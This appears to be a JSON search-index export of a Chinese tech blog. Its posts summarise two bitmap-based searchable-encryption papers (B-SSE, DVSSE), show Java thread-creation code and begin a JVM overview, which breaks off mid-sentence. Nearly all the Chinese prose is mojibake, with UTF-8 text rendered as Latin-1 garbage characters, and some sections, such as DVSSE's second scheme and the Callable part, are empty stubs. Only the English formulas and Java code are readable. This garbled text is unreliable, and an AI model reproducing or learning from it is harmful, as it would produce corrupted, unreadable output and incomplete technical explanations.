[{"title":"å¯æœç´¢åŠ å¯†ï¼šB-SSEæ–¹æ¡ˆ","url":"/posts/63937.html","content":"\n<center><b>è®ºæ–‡åç§°ï¼šã€ŠEncrypted Keyword Search Mechanism Based on Bitmap Index for Personal Storage Servicesã€‹</b></center>\n\n- ä½œè€…ï¼šYong Ho Hwang; Jae Woo Seo; ll Joo Kim\n- å•ä½ï¼šSamsung Research\n- ä¼šè®®ï¼š[2014 IEEE 13th International Conference on Trust, Security and Privacy in Computing and Communications](https://ieeexplore.ieee.org/xpl/conhome/7008824/proceeding)(TrustCom)\n- æ—¶é—´ï¼š2014å¹´9æœˆ\n\n|   å¤šå…³é”®å­—   |  æ¨¡ç³Šæœç´¢  |   å¯éªŒè¯   |\n| :----------: | :--------: | :--------: |\n|      âœ…       |     âŒ      |     âŒ      |\n| **åŠ¨æ€æ›´æ–°** | **å®‰å…¨æ€§** | **å¤æ‚åº¦** |\n|      âœ…       |    CKA2    |            |\n\n\n\n# 1ã€æ–¹æ¡ˆç®€ä»‹\n\næå‡ºäº†ä¸€ç§æ–°çš„åŸºäº BitMap ç´¢å¼•çš„å…³é”®å­—åŠ¨æ€å¯æœç´¢æœºåˆ¶ï¼Œè¯¥æœºåˆ¶ä»¥å€’æ’ç´¢å¼•å½¢å¼è¡¨ç¤ºä¸€ç»„æ–‡ä»¶ã€‚ä¸å®é™…ä½¿ç”¨ä¸­çš„å‰äººç›¸æ¯”ï¼Œæ‰€ææœºåˆ¶æ£€ç´¢æ—¶é—´å¿«ï¼Œç´¢å¼•é‡å°ã€‚å®ƒå¯¹éšæœºé¢„è¨€æœºæ¨¡å‹ä¸­çš„è‡ªé€‚åº”é€‰æ‹©å…³é”®å­—æ”»å‡»æ˜¯å®‰å…¨çš„\n\n\n\n# 2ã€å®‰å…¨æ€§\n\n| ç¬¦å· | æè¿°                            |\n| ---- | ------------------------------- |\n| F    | æ€»æ–‡ä»¶é›†åˆ                      |\n| F(w) | åŒ…å«å…³é”®å­—wçš„æ–‡ä»¶é›†åˆ           |\n| W    | è¡¨ç¤ºå”¯ä¸€å…³é”®å­—çš„é›†åˆ            |\n| W(f) | æ–‡ä»¶ f ä¸­åŒ…å«çš„å”¯ä¸€å…³é”®å­—çš„é›†åˆ |\n|      |                                 |\n|      |                                 |\n|      |                                 |\n\n\n\n# 3ã€å…·ä½“å®ç°\n\n## $Gen(1^k)$\n\n- generate random keys $K_1, K_2 â† \\{0, 1\\}k$,\n\n- generate a encryption key $K_e â† SKE.Gen(1^k)$ \n  - Let $SKE = (Gen, Enc, Dec)$ be a **symmetric encryption scheme**\n\n- output $K = (K_1, K_2, K_e)$\n\n## $BuildIndex(F, K)$\n\n- Building the search table $T_s$ï¼š\n\n  For all $i âˆˆ [w]$\n\n1. compute $id(w_i) = P(K_1, w_i)$\n\n   - $P:\\{0,1\\}^k Ã— \\{0,1\\}^Ï‰ â†’ \\{0,1\\}^{l_w}$ be a pseudo-random function \n\n   - where $Ï‰ = |w_i|$ and $l_w = |id(w_i)|$ \n2. generate $id(F(w_i))$\n3. make the bitmap $B_m(w_i)$ where $B_m(w_i)[j]$ = 1 for all $j âˆˆ id(F(w_i))$\n4. choose random $r_i â† \\{0,1\\}^{l_r}$ and compute $x_i = h_i âŠ• B_m(w_i)$ where $h_i = H(K_{w_i}||r_i)$ and $K_{w_i} =P(K_2, w_i)$\n\n   - $H : \\{0,1\\}^{k+l_r} â†’ \\{0,1\\}^m$ be a hash function where $l_r$ is the length of random numbers\n5. store $(key, value) = (id(w_i), x_i||r_i)$\n\n- Building the file table $T_f$ :\n\nâ€‹\t\tFor all $j âˆˆ id(F)$, where $f â‰¤ m$\n\n1.  compute $c_j â† SKE.Enc_{K_e} (f_j)$\n\n2) store $(key, value) = (j, c_j)$\n\n- output the index $I = (T_s, T_f)$.\n\n## $SearchToken(K, w_i)$\n\n- compute $id(w_i) = P(K_1, w_i)$ and $K_{w_i} = P(K_2, w_i)$ \n- output the search token $t_s = (id(w_i), K_{w_i})$\n\n## $Search(I, t_s)$\n\n- compute $T_s[id(w_i)] = x_i||r_i$\n\n- recover the bitmap $B_m(w_i) = x_i âŠ• H(K_{w_i} ||r_i)$ \n- for all $j$ such that $B_m(w_i)[j] = 1$, return the identifiers $j$ and the encrypted files $c_j$ \n\n- $f = SKE.Dec_{K_e} (c)$\n\n## $AddToken(K,f)$\n\nFor an added file $f$ and its keywords $w_i âˆˆ W(f)$\n\n- compute $id(w_i) = P(K_1, w_i)$\n\n- choose random $r_i â† \\{0,1\\}^r$ and compute $h_i = H(K_{w_i} ||r_i)$ where $K_{w_i} = P(K_2, w_i)$\n\n- output  $t_a = ({id(w_i)}, {h_i}, {r_i})$ and  $c â† SKE.Enc_{K_e} (f)$\n\n## $DeleteToken(K, f_j)$\n\nFor a deleted file $f_j$ and its keywords $w_i âˆˆ W(f_j)$\n\n- compute $id(w_i) = P(K_1, w_i)$\n- output  $t_d = (id(f_j ), {id(w_i)})$\n\n## $Add(I, t_a, c)$\n\n- Adding the encrypted file in $T_f$ :\n\n  - Scan  $T_f$ \n\n  -  if  $T_f[j] = null$, assign the subscript $j$ to the added file and store $(key, value) = (j, c_j )$ in the $j-th$ row; \n  - if  $T_f[j]\\neq null$, return âŠ¥ indicating an error.\n\n- Updating the bitmaps for $W(f)$ in $T_s$:\n\n  For given $id(w_i)$ appeared for the first time\n\n  - store $(key, value) = (id(w_i), x_i||r_i)$ where $x_i = h_i âŠ• B_m(\\{j\\})$\n\n  For given $id(w_i)$ existed before\n\n  - find the value $T_s[id(w_i)] = x_i||r_i$\n  - compute $x_i = x_i âŠ• B_m(\\{j\\})$ \n  - where $B_m(\\{j\\})$ is the m-bit array such that $j-th$ bit is 1 and the other bits are 0.\n\n## $Delete(I, t_d)$\n\n- Deleting the encrypted file in $T_f$ :\n  - Find the row with $key = j$  and delete it in $T_f$ .\n- Updating the bitmaps for $W(f_j)$ in $T_s$ï¼š\n  - For all given $id(w_i)$\n  - find the value $T_s[id(w_i)] = x_i||r_i$,\n  -  compute $x_i = x_i âŠ• B_m(\\{j\\})$\n","tags":["å¯æœç´¢åŠ å¯†"],"categories":["Crypto"]},{"title":"å¯æœç´¢åŠ å¯†ï¼šDVSSEæ–¹æ¡ˆ","url":"/posts/49068.html","content":"\n<center><b>è®ºæ–‡åç§°ï¼šã€ŠDynamic Verifiable Encrypted Keyword Search Using Bitmap Index and Homomorphic MACã€‹</b></center>\n\n- ä½œè€…ï¼šRajkumar Ramasamy; S. Sree Vivek; Praveen George; Bharat S. Rawal Kshatriya\n- å•ä½ï¼šSamsung R&D Institute India\n- ä¼šè®®ï¼š [2017 IEEE 4th International Conference on Cyber Security and Cloud Computing (CSCloud)](https://ieeexplore.ieee.org/xpl/conhome/7985548/proceeding)\n- æ—¶é—´ï¼š2017å¹´7æœˆ\n\n|   å¤šå…³é”®å­—   |  æ¨¡ç³Šæœç´¢  |   å¯éªŒè¯   |\n| :----------: | :--------: | :--------: |\n|      âŒ       |     âŒ      |     âœ…      |\n| **åŠ¨æ€æ›´æ–°** | **å®‰å…¨æ€§** | **å¤æ‚åº¦** |\n|      âœ…       | CKA2 + CMA |   $O(M)$   |\n\næ³¨ï¼š*M: Total number of Keywords*\n\n\n\n# 0ã€åŸºç¡€æ¦‚å¿µ\n\n`Honest But Curious Cloud Service Provider (HBC-CSP)`ï¼šè¯šå®ä½†å¥½å¥‡çš„äº‘æœåŠ¡æä¾›å•†\n\n- å®‰å…¨åœ°å­˜å‚¨åŠ å¯†æ•°æ®å¹¶è¯šå®æ‰§è¡Œæœç´¢æ“ä½œã€‚å®ƒè¯•å›¾ä»ç³»ç»Ÿä¸­å­¦ä¹ å­˜å‚¨æ•°æ®çš„ä»»ä½•æœ‰ç”¨ä¿¡æ¯ï¼Œä½†ä¸ä¼šåç¦»åè®®ã€‚\n\n`Semi Honest But Curious Cloud Service Providerï¼ˆSHBC-CSPï¼‰`ï¼šåŠè¯šå®ä½†å¥½å¥‡çš„äº‘æœåŠ¡æä¾›å•†\n\n- è¯šå®åœ°å­˜å‚¨åŠ å¯†æ•°æ®ï¼Œå®ƒè¯•å›¾ä»ç³»ç»Ÿä¸­å­¦ä¹ å­˜å‚¨æ•°æ®çš„ä»»ä½•æœ‰ç”¨ä¿¡æ¯ï¼Œå¹¶å°è¯•ä»¥éšè”½çš„æ–¹å¼åç¦»åè®®ã€‚\n- æˆ‘ä»¬è®¤ä¸ºè¿™ä¸ªå¼ºå¤§çš„SHBC-CSPå¯¹æ‰‹å¯èƒ½ä¼šè‡ªç§åœ°æ“çºµæœç´¢ç»“æœä»¥èŠ‚çœå…¶è®¡ç®—æˆ–ä¸‹è½½å¸¦å®½\n\n\n\n#  1ã€æ–¹æ¡ˆç®€ä»‹\n\næœ¬æ–‡è€ƒè™‘äº†åœ¨ SHBC-CSP å­˜åœ¨çš„æƒ…å†µä¸‹çš„ SSEã€‚åœ¨ SHBC-CSP é¢å‰ä¸º SSE **å®šä¹‰äº†**ä¸€ä¸ªæ–°çš„å®‰å…¨æ¦‚å¿µï¼Œ**è®¾è®¡äº†**ä¸¤ä¸ªæ–°çš„ SSE æ–¹æ¡ˆï¼Œå¹¶åœ¨æè®®çš„å®‰å…¨æ¦‚å¿µä¸­æ­£å¼**è¯æ˜äº†**å®ƒä»¬çš„å®‰å…¨æ€§ã€‚åŠ¨æ€å¯éªŒè¯åŠ å¯†å…³é”®å­—æœç´¢ï¼ˆDVSSEï¼‰æ˜¯æ®æˆ‘ä»¬æ‰€çŸ¥çš„**ç¬¬ä¸€ä¸ª**æ—¢åŠ¨æ€åˆå¯éªŒè¯çš„ SSE æ–¹æ¡ˆã€‚\n\næœ¬æ–‡è´¡çŒ®ï¼š\n\n- åˆ†æäº† SHBC-CSP å­˜åœ¨ä¸‹åŠ å¯†å…³é”®å­—æœç´¢çš„å®‰å…¨æ€§ï¼Œå¹¶æä¾›äº†ä¸€ç§æ–°çš„å®‰å…¨æ¨¡å‹æ¥å¤„ç†è¿™ç§ç°å®å¯¹æ‰‹ã€‚\n- [6]ä¸­æå‡ºçš„æ–¹æ¡ˆç¼ºä¹éªŒè¯æ£€ç´¢ç»“æœæ­£ç¡®æ€§çš„è§„å®šã€‚å› æ­¤ï¼ŒHwangç­‰äººçš„IND-CKA2å®‰å…¨æ–¹æ¡ˆåœ¨SHBC-CSPå­˜åœ¨çš„æƒ…å†µä¸‹æ˜¯ä¸å®‰å…¨çš„ã€‚\n\n- æˆ‘ä»¬æå‡ºäº†ä¸¤ç§æ–°æ–¹æ¡ˆï¼Œåœ¨SHBC-CSPå­˜åœ¨çš„æƒ…å†µä¸‹è¿›è¡ŒåŠ å¯†å…³é”®å­—æœç´¢ï¼Œå¹¶åœ¨æ–°æå‡ºçš„å®‰å…¨æ¨¡å‹ä¸­è¯æ˜å…¶å®‰å…¨æ€§ã€‚\n- æˆ‘ä»¬çš„ç¬¬ä¸€ä¸ªæ–¹æ¡ˆæ˜¯å¯¹[6]ä¸­æå‡ºçš„ç°æœ‰åŸºäºä½å›¾çš„åŠ å¯†å…³é”®å­—æœç´¢çš„æ”¹è¿›ã€‚å°½ç®¡æ­¤æ–¹æ¡ˆæä¾›äº†æœç´¢ç»“æœå¯éªŒè¯æ€§ï¼Œä½†å®ƒæ— æ³•åŠ¨æ€æ›´æ–°ã€‚\n- æˆ‘ä»¬çš„ç¬¬äºŒç§æ–¹æ¡ˆæä¾›äº†ä½å›¾çš„æœºå¯†æ€§ï¼Œæ”¯æŒåŠ¨æ€æ›´æ–°å’Œæœç´¢ç»“æœå¯éªŒè¯æ€§ï¼Œè¿™æ˜¯é¿å…è®¿é—®æ¨¡å¼æ³„æ¼æ‰€å¿…éœ€çš„ã€‚ä¸ºäº†å®ç°åŠ¨æ€æ›´æ–°å’Œæœç´¢ç»“æœçš„å¯éªŒè¯æ€§ï¼Œæˆ‘ä»¬åˆ©ç”¨å¤åˆæ®‹å·®è®¾è®¡äº†ä¸€ç§æ–°çš„åŒæ€MACã€‚\n\n\n\n# 2ã€å®‰å…¨æ€§\n\nDynamicIND-CKA2-security\n\nSetup ï¼šC ç”Ÿæˆ DVSSE æ–¹æ¡ˆçš„å¯†é’¥Kï¼Œè®¾ç½®ç³»ç»Ÿå‚æ•°Paramsã€‚Aé€‰æ‹©ä¸€ä¸ªæ–‡æ¡£é›†åˆFï¼Œç”ŸæˆFä¸­å­˜åœ¨çš„å…³é”®å­—Wçš„åˆ—è¡¨ï¼Œå¹¶é€‰æ‹©ä¸€ä¸ªå…³é”®å­—W *âˆˆWå¹¶å°†å…¶äº¤ç»™cã€‚cç”ŸæˆFçš„å®‰å…¨ç´¢å¼•Iå¹¶å°†å…¶è¿”å›ç»™A.Cé€‰æ‹©ä½b Râ†{0,1}ã€‚å¦‚æœb=0,Cè®¾ç½®å®é™…åŠ å¯†ä½å›¾x *(å¯¹åº”äºw *)ã€‚å¦‚æœb=1,Cåœ¨åŠ å¯†ä½å›¾çš„èŒƒå›´å†…éšæœºé€‰æ‹©x *ã€‚\n\nTraining Phase:\n\nA è¢«å…è®¸æŸ¥è¯¢ä»¥ä¸‹é¢„è¨€æœºï¼Œå…¶é™åˆ¶æ˜¯ A ä¸èƒ½å¯¹ w * è¿›è¡Œä»»ä½•é¢„è¨€æœºæŸ¥è¯¢\n\nOSearchT oken(w): Returns search token Ï„s.\n\nâ€¢ OAddT oken(f ): Returns add token Ï„a.\n\nâ€¢ ODeleteT oken(f ): Returns delete token Ï„d.\n\nâ€¢ OV erif y(T ag,x,id(w)): Returns Accept or Reject.\n\nâ€¢ OBitmapDecryption(x): Returns Bm(w).\n\n Challenge Phase:\n\nC å°† id(wâˆ—) æä¾›ç»™ A\n\nGuess:\n\nA è¾“å‡ºä¸€ä¸ªä½b 'ï¼Œå¦‚æœx *å¯¹w *å¯¹åº”çš„ä½å›¾è¿›è¡ŒåŠ å¯†ï¼Œåˆ™b 'ä¸º0ï¼Œå¦åˆ™è¾“å‡º1ã€‚\n\nå¦‚æœå¯¹äºæ‰€æœ‰æ¦‚ç‡å¤šé¡¹å¼æ—¶é—´å¯¹æ‰‹ Aï¼Œè¯¥æ–¹æ¡ˆæ˜¯ IND-CKA2 å®‰å…¨çš„ï¼Œåˆ™å­˜åœ¨ä¸€ä¸ªå¯å¿½ç•¥çš„å‡½æ•° negl(.) ä½¿å¾—ï¼š\n\nP r[DV SSEIND-CKA2A (Îº) â†’ (b = bâ€²)] â‰¤ 1 2 + negl(Îº)\n\n\n\n# 3ã€å…·ä½“å®ç°\n\n## æ–¹æ¡ˆä¸€ï¼šVSSE\n\n> consists five algorithms $(KeyGen, BuildIndex, SearchToken, Search, Verify)$\n\n### KeyGen(Îº)\n\nChoose three cryptographic MAC's defined as follows:\n\n- $H_1 : \\{0, 1\\}^Îº Ã— \\{0, 1\\}^âˆ— â†’ \\{0, 1\\}^Îº$\n\n- $H_2 : \\{0, 1\\}^Îº Ã— \\{0, 1\\}^âˆ—Ã— \\{0, 1\\}^Îº â†’ \\{0, 1\\}^Îº$\n\n- $H_3 : \\{0, 1\\}^Îº Ã— \\{0, 1\\}^n Ã— \\{0, 1\\}^Îº â†’ \\{0, 1\\}^Îº$\n\nWhere, the first inputs are cryptographic keys.\n\nOutput the key $K = <K_1, K_2, K_e, K_hã€‰ \\stackrel{R}â† \\{0,1\\}^Îº$\n\n### BuildIndex(F, K)\n\n$P:\\{0,1\\}^k Ã— \\{0,1\\}^Ï‰ â†’ \\{0,1\\}^{l_w}$ be a pseudo-random function where $Ï‰ = |w_i|$ and $l_w = |id(w_i)|$ for wi âˆˆ W;\n\n the keyword identifier id(wi) is computed by a pseudo-random function P.\n\n\n\n- Building the search table $T_s$ï¼š\n\n  For all $i âˆˆ [w]$,\n\n1) compute $id(w_i) = P(K_1, w_i)$\n2) generate $id(F(w_i))$\n3) make the bitmap $B_m(w_i)$ where $B_m(w_i)[j]$ = 1 for all $j âˆˆ id(F(w_i))$\n4) choose random $r_i â† \\{0,1\\}^r$ and compute $x_i = h_i âŠ• B_m(w_i)$ where $h_i = H(K_{w_i}||r_i)$ and $K_{w_i} =P(K_2, w_i)$\n5) store $(key, value) = (id(w_i), x_i||r_i)$\n\n- Building the file table $T_f$ :\n\nâ€‹\t\tFor all $j âˆˆ id(F)$, where $f â‰¤ m$\n\n1.  compute $c_j â† SKE.Enc_{K_e} (f_j)$\n\n2) store $(key, value) = (j, c_j)$\n\n- output the index $I = (T_s, T_f)$.\n\n## æ–¹æ¡ˆäºŒï¼šDVSSE\n","tags":["å¯æœç´¢åŠ å¯†"],"categories":["Crypto"]},{"title":"Java-JUC","url":"/posts/3092.html","content":"\n\n\n# â“ªåŸºç¡€\n\n## è¿›ç¨‹&çº¿ç¨‹\n\n- è¿›ç¨‹ï¼šæŒ‡ä¸€ä¸ªå†…å­˜ä¸­è¿è¡Œçš„åº”ç”¨ç¨‹åºï¼Œæ¯ä¸ªè¿›ç¨‹éƒ½æœ‰è‡ªå·±ç‹¬ç«‹çš„ä¸€å—å†…å­˜ç©ºé—´ã€‚\n- çº¿ç¨‹ï¼šæ¯”è¿›ç¨‹æ›´å°çš„æ‰§è¡Œå•ä½ï¼Œä¸€ä¸ªè¿›ç¨‹å¯ä»¥å¯åŠ¨å¤šä¸ªçº¿ç¨‹ï¼Œæ¯æ¡çº¿ç¨‹å¹¶è¡Œæ‰§è¡Œä¸åŒçš„ä»»åŠ¡ã€‚\n\n## å¹¶è¡Œ&å¹¶å‘\n\n* å¹¶è¡Œï¼ˆParallelï¼‰ï¼šåœ¨åŒä¸€æ—¶åˆ»ï¼Œæœ‰å¤šä¸ªæŒ‡ä»¤åœ¨å¤šä¸ª CPU ä¸ŠåŒæ—¶æ‰§è¡Œ\n* å¹¶å‘ï¼ˆConcurrentï¼‰ï¼šåœ¨åŒä¸€æ—¶åˆ»ï¼Œæœ‰å¤šä¸ªæŒ‡ä»¤åœ¨å•ä¸ª CPU ä¸Šäº¤æ›¿æ‰§è¡Œ\n\n## åŒæ­¥&å¼‚æ­¥\n\n* åŒæ­¥ï¼ˆsyncï¼‰ï¼šéœ€è¦ç­‰å¾…ç»“æœè¿”å›ï¼Œæ‰èƒ½ç»§ç»­è¿è¡Œ\n* å¼‚æ­¥ï¼ˆAsyncï¼‰ï¼šä¸éœ€è¦ç­‰å¾…ç»“æœè¿”å›ï¼Œå°±èƒ½ç»§ç»­è¿è¡Œ\n\n# â‘ çº¿ç¨‹\n\n## çº¿ç¨‹åˆ›å»º\n\n### Thread\n\n```java\n@Slf4j\npublic class ThreadCreate {\n    public static void main(String[] args) {\n        Thread t1 = new Thread(\"t1\"){\n            @Override\n            public void run() {\n                log.debug(\"hello\");\n            }\n        };\n        // å¯åŠ¨çº¿ç¨‹\n        t1.start();\n        log.debug(\"do other things ...\");\n    }\n}\n```\n\n### Runnable\n\n```java\n@Slf4j\npublic class ThreadCreate {\n    public static void main(String[] args) {\n        Runnable runnable = new Runnable() {\n            @Override\n            public void run(){\n                log.debug(\"hello\");\n            }\n        };\n        Thread t2 = new Thread(runnable, \"t2\");\n        // å¯åŠ¨çº¿ç¨‹\n        t2.start();\n        log.debug(\"do other things ...\");  \n    }\n}\n\n//å†™æ³•2\nThread t4 = new Thread(new Runnable() {\n    @Override\n    public void run() {\n        log.debug(\"hello\");\n    }\n\t},\"t4\");\nt4.start();\n```\n\nJava 8 ä»¥åå¯ä»¥ä½¿ç”¨ lambda ç²¾ç®€ä»£ç \n\n```java\nRunnable runnable = () -> log.debug(\"hello\");\nThread t4 = new Thread(runnable,\"t4\");\nt4.start();\n\n\n//å†™æ³•2\nThread t4 = new Thread(() ->log.debug(\"hello\"),\"t4\");\nt4.start();\n```\n\n### Callable\n\n\n\n\n\n# Sponsorâ¤ï¸\n\næ‚¨çš„æ”¯æŒæ˜¯æˆ‘ä¸æ–­å‰è¿›çš„åŠ¨åŠ›ï¼Œå¦‚æœæ‚¨æ„Ÿè§‰æœ¬æ–‡å¯¹æ‚¨æœ‰æ‰€å¸®åŠ©çš„è¯ï¼Œå¯ä»¥è€ƒè™‘æ‰“èµä¸€ä¸‹æœ¬æ–‡ï¼Œç”¨ä»¥ç»´æŒæœ¬åšå®¢çš„è¿è¥è´¹ç”¨ï¼Œæ‹’ç»ç™½å«–ï¼Œä»ä½ æˆ‘åšèµ·ï¼ğŸ¥°ğŸ¥°ğŸ¥°\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">æ”¯ä»˜å®</td>\n         <td style=\"text-align:center;\">å¾®ä¿¡</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["JUC"],"categories":["JavaSE"]},{"title":"Java-JVM","url":"/posts/14485.html","content":"\n# â‘ JVMæ¦‚è¿°\n\n## â¶åŸºæœ¬ä»‹ç»\n\nJVMï¼šå…¨ç§° Java Virtual Machineï¼Œä¸€ä¸ªè™šæ‹Ÿè®¡ç®—æœºï¼ŒJava ç¨‹åºçš„è¿è¡Œç¯å¢ƒï¼ˆJavaäºŒè¿›åˆ¶å­—èŠ‚ç çš„è¿è¡Œç¯å¢ƒï¼‰\n\nç‰¹ç‚¹ï¼š\n\n* Java è™šæ‹ŸæœºåŸºäº**äºŒè¿›åˆ¶å­—èŠ‚ç **æ‰§è¡Œï¼Œç”±ä¸€å¥—å­—èŠ‚ç æŒ‡ä»¤é›†ã€ä¸€ç»„å¯„å­˜å™¨ã€ä¸€ä¸ªæ ˆã€ä¸€ä¸ªåƒåœ¾å›æ”¶å †ã€ä¸€ä¸ªæ–¹æ³•åŒºç­‰ç»„æˆ\n* JVM å±è”½äº†ä¸æ“ä½œç³»ç»Ÿå¹³å°ç›¸å…³çš„ä¿¡æ¯ï¼Œä»è€Œèƒ½å¤Ÿè®© Java ç¨‹åºåªéœ€è¦ç”Ÿæˆèƒ½å¤Ÿåœ¨ JVM ä¸Šè¿è¡Œçš„å­—èŠ‚ç æ–‡ä»¶ï¼Œé€šè¿‡è¯¥æœºåˆ¶å®ç°çš„**è·¨å¹³å°æ€§**ã€‚å³ä¸€æ¬¡ç¼–è¯‘ï¼Œå¤„å¤„æ‰§è¡Œ\n* è‡ªåŠ¨çš„å†…å­˜ç®¡ç†ï¼Œåƒåœ¾å›æ”¶æœºåˆ¶\n\nJVM ç»“æ„ï¼š\n\n![](https://img.jwt1399.top/img/202212031705537.png)\n\nJava ä»£ç æ‰§è¡Œæµç¨‹ï¼š`Java ç¨‹åº --ï¼ˆç¼–è¯‘ï¼‰--> å­—èŠ‚ç æ–‡ä»¶ --ï¼ˆè§£é‡Šæ‰§è¡Œï¼‰--> æ“ä½œç³»ç»Ÿï¼ˆWinï¼ŒLinuxï¼‰`\n\n| ![](https://img.jwt1399.top/img/202212031714323.png) | ![](https://img.jwt1399.top/img/202212031714094) |\n| ---------------------------------------------------- | ------------------------------------------------ |\n\nJVMã€JREã€JDK å¯¹æ¯”ï¼š\n\n* JDK(Java SE Development Kit)ï¼šJava æ ‡å‡†å¼€å‘åŒ…ï¼Œæä¾›äº†ç¼–è¯‘ã€è¿è¡Œ Java ç¨‹åºæ‰€éœ€çš„å„ç§å·¥å…·å’Œèµ„æº\n* JRE( Java Runtime Environment)ï¼šJava è¿è¡Œç¯å¢ƒï¼Œç”¨äºè§£é‡Šæ‰§è¡Œ Java çš„å­—èŠ‚ç æ–‡ä»¶\n\n<img src=\"https://img.jwt1399.top/img/202212031706253.png\" />\n\n------\n\n## â·æ¶æ„æ¨¡å‹\n\nJava ç¼–è¯‘å™¨è¾“å…¥çš„æŒ‡ä»¤æµæ˜¯ä¸€ç§åŸºäºæ ˆçš„æŒ‡ä»¤é›†æ¶æ„ã€‚å› ä¸ºè·¨å¹³å°çš„è®¾è®¡ï¼ŒJava çš„æŒ‡ä»¤éƒ½æ˜¯æ ¹æ®æ ˆæ¥è®¾è®¡çš„ï¼Œä¸åŒå¹³å° CPU æ¶æ„ä¸åŒï¼Œæ‰€ä»¥ä¸èƒ½è®¾è®¡ä¸ºåŸºäºå¯„å­˜å™¨æ¶æ„\n\n* åŸºäºæ ˆå¼æ¶æ„çš„ç‰¹ç‚¹ï¼š\n  * è®¾è®¡å’Œå®ç°ç®€å•ï¼Œé€‚ç”¨äºèµ„æºå—é™çš„ç³»ç»Ÿ\n  * ä½¿ç”¨é›¶åœ°å€æŒ‡ä»¤æ–¹å¼åˆ†é…ï¼Œæ‰§è¡Œè¿‡ç¨‹ä¾èµ–æ“ä½œæ ˆï¼ŒæŒ‡ä»¤é›†æ›´å°ï¼Œç¼–è¯‘å™¨å®¹æ˜“å®ç°\n    * é›¶åœ°å€æŒ‡ä»¤ï¼šæœºå™¨æŒ‡ä»¤çš„ä¸€ç§ï¼Œæ˜¯æŒ‡ä»¤ç³»ç»Ÿä¸­çš„ä¸€ç§ä¸è®¾åœ°å€å­—æ®µçš„æŒ‡ä»¤ï¼Œåªæœ‰æ“ä½œç è€Œæ²¡æœ‰åœ°å€ç ã€‚è¿™ç§æŒ‡ä»¤æœ‰ä¸¤ç§æƒ…å†µï¼šä¸€æ˜¯æ— éœ€æ“ä½œæ•°ï¼Œå¦ä¸€ç§æ˜¯æ“ä½œæ•°ä¸ºé»˜è®¤çš„ï¼ˆéšå«çš„ï¼‰ï¼Œé»˜è®¤ä¸ºæ“ä½œæ•°åœ¨å¯„å­˜å™¨ï¼ˆACCï¼‰ä¸­ï¼ŒæŒ‡ä»¤å¯ç›´æ¥è®¿é—®å¯„å­˜å™¨\n    * ä¸€åœ°å€æŒ‡ä»¤ï¼šä¸€ä¸ªæ“ä½œç å¯¹åº”ä¸€ä¸ªåœ°å€ç ï¼Œé€šè¿‡åœ°å€ç å¯»æ‰¾æ“ä½œæ•°\n  * ä¸éœ€è¦ç¡¬ä»¶çš„æ”¯æŒï¼Œå¯ç§»æ¤æ€§æ›´å¥½ï¼Œæ›´å¥½å®ç°è·¨å¹³å°\n* åŸºäºå¯„å­˜å™¨æ¶æ„çš„ç‰¹ç‚¹ï¼š\n  * éœ€è¦ç¡¬ä»¶çš„æ”¯æŒï¼Œå¯ç§»æ¤æ€§å·®\n  * æ€§èƒ½æ›´å¥½ï¼Œæ‰§è¡Œæ›´é«˜æ•ˆï¼Œå¯„å­˜å™¨æ¯”å†…å­˜å¿«\n  * ä»¥ä¸€åœ°å€æŒ‡ä»¤ã€äºŒåœ°å€æŒ‡ä»¤ã€ä¸‰åœ°å€æŒ‡ä»¤ä¸ºä¸»ï¼Œè€ŒåŸºäºæ ˆå¼æ¶æ„çš„æŒ‡ä»¤é›†å´æ˜¯ä»¥é›¶åœ°å€æŒ‡ä»¤ä¸ºä¸»\n\n***\n\n## â¸ç”Ÿå‘½å‘¨æœŸ\n\nJVM çš„ç”Ÿå‘½å‘¨æœŸåˆ†ä¸ºä¸‰ä¸ªé˜¶æ®µï¼Œåˆ†åˆ«ä¸ºï¼šå¯åŠ¨ã€è¿è¡Œã€æ­»äº¡\n\n- **å¯åŠ¨**ï¼šå½“å¯åŠ¨ä¸€ä¸ª Java ç¨‹åºæ—¶ï¼Œé€šè¿‡å¼•å¯¼ç±»åŠ è½½å™¨ï¼ˆbootstrap class loaderï¼‰åˆ›å»ºä¸€ä¸ªåˆå§‹ç±»ï¼ˆinitial classï¼‰ï¼Œå¯¹äºæ‹¥æœ‰ main å‡½æ•°çš„ç±»å°±æ˜¯ JVM å®ä¾‹è¿è¡Œçš„èµ·ç‚¹\n\n- **è¿è¡Œ**ï¼š\n\n  - main() æ–¹æ³•æ˜¯ä¸€ä¸ªç¨‹åºçš„åˆå§‹èµ·ç‚¹ï¼Œä»»ä½•çº¿ç¨‹å‡å¯ç”±åœ¨æ­¤å¤„å¯åŠ¨\n\n  - åœ¨ JVM å†…éƒ¨æœ‰ä¸¤ç§çº¿ç¨‹ç±»å‹ï¼Œåˆ†åˆ«ä¸ºï¼šç”¨æˆ·çº¿ç¨‹å’Œå®ˆæŠ¤çº¿ç¨‹ï¼Œ**JVM ä½¿ç”¨çš„æ˜¯å®ˆæŠ¤çº¿ç¨‹ï¼Œmain() å’Œå…¶ä»–çº¿ç¨‹ä½¿ç”¨çš„æ˜¯ç”¨æˆ·çº¿ç¨‹**ï¼Œå®ˆæŠ¤çº¿ç¨‹ä¼šéšç€ç”¨æˆ·çº¿ç¨‹çš„ç»“æŸè€Œç»“æŸ\n\n  - æ‰§è¡Œä¸€ä¸ª Java ç¨‹åºæ—¶ï¼ŒçœŸçœŸæ­£æ­£åœ¨æ‰§è¡Œçš„æ˜¯ä¸€ä¸ª **Java è™šæ‹Ÿæœºçš„è¿›ç¨‹**\n\n  - JVM æœ‰ä¸¤ç§è¿è¡Œæ¨¡å¼ Server ä¸ Clientï¼Œä¸¤ç§æ¨¡å¼çš„åŒºåˆ«åœ¨äºï¼šClient æ¨¡å¼å¯åŠ¨é€Ÿåº¦è¾ƒå¿«ï¼ŒServer æ¨¡å¼å¯åŠ¨è¾ƒæ…¢ï¼›ä½†æ˜¯å¯åŠ¨è¿›å…¥ç¨³å®šæœŸé•¿æœŸè¿è¡Œä¹‹å Server æ¨¡å¼çš„ç¨‹åºè¿è¡Œé€Ÿåº¦æ¯” Client è¦å¿«å¾ˆå¤š\n\n    Server æ¨¡å¼å¯åŠ¨çš„ JVM 